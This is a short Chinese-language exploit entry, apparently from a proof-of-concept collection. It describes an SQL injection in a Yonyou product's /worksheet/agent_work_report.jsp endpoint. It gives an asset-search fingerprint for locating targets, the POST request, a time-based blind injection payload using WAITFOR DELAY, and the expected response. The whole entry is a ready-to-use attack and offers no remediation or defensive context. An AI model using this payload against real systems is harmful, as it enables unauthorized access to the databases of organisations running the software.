# 时空用友agent_work_report存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`product="Crocus"`
- **请求**：`POST /worksheet/agent_work_report.jsp HTTP/1.1`

**Payload**
```
id=1';WAITFOR DELAY '0:0:5'--
```
- **响应特征**：200